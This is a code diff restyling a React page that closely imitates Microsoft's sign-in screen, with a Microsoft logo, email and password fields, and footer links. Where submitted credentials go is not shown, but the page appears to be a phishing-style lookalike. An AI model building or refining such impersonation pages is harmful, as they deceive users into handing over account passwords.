@@ -90,84 +90,93 @@ export default function Home() {
     };
 
     return (
-        <div className="min-h-screen bg-white flex items-center justify-center">
-            <div className="max-w-md w-full space-y-8">
-                <div className="text-center">
-                    {/* Microsoft Logo */}
-                    <div className="flex justify-center mb-8">
-                        <svg width="108" height="23" viewBox="0 0 108 23" fill="none" xmlns="http://www.w3.org/2000/svg">
-                            <rect width="10" height="10" fill="#F25022"/>
-                            <rect x="12" width="10" height="10" fill="#7FBA00"/>
-                            <rect y="12" width="10" height="10" fill="#00A4EF"/>
-                            <rect x="12" y="12" width="10" height="10" fill="#FFB900"/>
-                            <text x="30" y="16" fontFamily="Segoe UI" fontSize="16" fontWeight="600" fill="#323130">Microsoft</text>
-                        </svg>
-                    </div>
+        <div className="min-h-screen bg-gradient-to-br from-blue-50 via-white to-purple-50 flex items-center justify-center p-4">
+            <div className="w-full max-w-md">
+                {/* Microsoft Logo */}
+                <div className="flex items-center mb-8">
+                    <svg width="108" height="23" viewBox="0 0 108 23" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <rect width="10" height="10" fill="#F25022"/>
+                        <rect x="12" width="10" height="10" fill="#7FBA00"/>
+                        <rect y="12" width="10" height="10" fill="#00A4EF"/>
+                        <rect x="12" y="12" width="10" height="10" fill="#FFB900"/>
+                        <text x="30" y="16" fontFamily="Segoe UI" fontSize="16" fontWeight="600" fill="#323130">Microsoft</text>
+                    </svg>
+                </div>
 
+                {/* Main Card */}
+                <div className="bg-white rounded-lg shadow-lg border border-gray-200 p-8">
                     <h1 className="text-2xl font-semibold text-gray-900 mb-8">Sign in</h1>
+
+                    <form onSubmit={handleSubmit} className="space-y-6">
+                        <div>
+                            <input
+                                type="email"
+                                value={email}
+                                onChange={(e) => setEmail(e.target.value)}
+                                className="w-full input-microsoft mobile-input"
+                                placeholder="Email, phone, or Skype"
+                                required
+                            />
+                            {emailError && (
+                                <p className="mt-2 text-sm text-red-600">{emailError}</p>
+                            )}
+                        </div>
+
+                        <div>
+                            <input
+                                type="password"
+                                value={password}
+                                onChange={(e) => setPassword(e.target.value)}
+                                className="w-full input-microsoft mobile-input"
+                                placeholder="Password"
+                                required
+                            />
+                            {passwordError && (
+                                <p className="mt-2 text-sm text-red-600">{passwordError}</p>
+                            )}
+                        </div>
+
+                        <div className="flex justify-end">
+                            <button
+                                type="submit"
+                                disabled={isLoading}
+                                className="btn-microsoft"
+                            >
+                                {isLoading ? 'Signing in...' : 'Sign in'}
+                            </button>
+                        </div>
+                    </form>
+
+                    <div className="mt-8 space-y-4">
+                        <div>
+                            <a href="#" className="text-blue-600 hover:text-blue-500 text-sm font-medium">
+                                No account? Create one!
+                            </a>
+                        </div>
+                        <div>
+                            <a href="#" className="text-blue-600 hover:text-blue-500 text-sm font-medium">
+                                Can&apos;t access your account?
+                            </a>
+                        </div>
+                    </div>
+
+                    <div className="mt-8 pt-6 border-t border-gray-200">
+                        <button className="w-full flex items-center justify-center space-x-2 text-sm text-gray-600 hover:text-gray-800 py-2 px-3 rounded-sm hover:bg-gray-50 transition-colors">
+                            <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M8 2C6.5 2 5.25 2.75 4.5 4C3.75 2.75 2.5 2 1 2C0.45 2 0 2.45 0 3V5C0 5.55 0.45 6 1 6H2V8C2 8.55 2.45 9 3 9H5C5.55 9 6 8.55 6 8V6H7C7.55 6 8 5.55 8 5V3C8 2.45 7.55 2 7 2H8Z" fill="#605E5C"/>
+                                <path d="M10 4C10.55 4 11 4.45 11 5V7C11 7.55 10.55 8 10 8H9V10C9 10.55 8.55 11 8 11H6C5.45 11 5 10.55 5 10V8H4C3.45 8 3 7.55 3 7V5C3 4.45 3.45 4 4 4H10Z" fill="#605E5C"/>
+                            </svg>
+                            <span>Sign-in options</span>
+                        </button>
+                    </div>
                 </div>
 
-                <form onSubmit={handleSubmit} className="space-y-6">
-                    <div>
-                        <input
-                            type="email"
-                            value={email}
-                            onChange={(e) => setEmail(e.target.value)}
-                            className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm placeholder-gray-400 focus:outline-none focus:ring-blue-500 focus:border-blue-500"
-                            placeholder="Email, phone, or Skype"
-                            required
-                        />
-                        {emailError && (
-                            <p className="mt-1 text-sm text-red-600">{emailError}</p>
-                        )}
-                    </div>
-
-                    <div>
-                        <input
-                            type="password"
-                            value={password}
-                            onChange={(e) => setPassword(e.target.value)}
-                            className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm placeholder-gray-400 focus:outline-none focus:ring-blue-500 focus:border-blue-500"
-                            placeholder="Password"
-                            required
-                        />
-                        {passwordError && (
-                            <p className="mt-1 text-sm text-red-600">{passwordError}</p>
-                        )}
-                    </div>
-
-                    <button
-                        type="submit"
-                        disabled={isLoading}
-                        className="w-full flex justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 disabled:opacity-50"
-                    >
-                        {isLoading ? 'Signing in...' : 'Sign in'}
-                    </button>
-                </form>
-
-                <div className="text-center space-y-4">
-                    <div>
-                        <a href="#" className="text-blue-600 hover:text-blue-500 text-sm">
-                            No account? Create one!
-                        </a>
-                    </div>
-                    <div>
-                        <a href="#" className="text-blue-600 hover:text-blue-500 text-sm">
-                            Can&apos;t access your account?
-                        </a>
-                    </div>
-                    <div className="flex items-center justify-center space-x-2 text-sm text-gray-600">
-                        <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
-                            <path d="M8 2C6.5 2 5.25 2.75 4.5 4C3.75 2.75 2.5 2 1 2C0.45 2 0 2.45 0 3V5C0 5.55 0.45 6 1 6H2V8C2 8.55 2.45 9 3 9H5C5.55 9 6 8.55 6 8V6H7C7.55 6 8 5.55 8 5V3C8 2.45 7.55 2 7 2H8Z" fill="#605E5C"/>
-                            <path d="M10 4C10.55 4 11 4.45 11 5V7C11 7.55 10.55 8 10 8H9V10C9 10.55 8.55 11 8 11H6C5.45 11 5 10.55 5 10V8H4C3.45 8 3 7.55 3 7V5C3 4.45 3.45 4 4 4H10Z" fill="#605E5C"/>
-                        </svg>
-                        <span>Sign-in options</span>
-                    </div>
-                </div>
-
-                <div className="text-center text-sm text-gray-600 space-x-4">
+                {/* Footer */}
+                <div className="mt-8 text-center text-sm text-gray-600 space-x-4">
                     <a href="#" className="hover:text-gray-800">Terms of use</a>
+                    <span>•</span>
                     <a href="#" className="hover:text-gray-800">Privacy & cookies</a>
+                    <span>•</span>
                     <a href="#" className="hover:text-gray-800">...</a>
                 </div>
             </div>
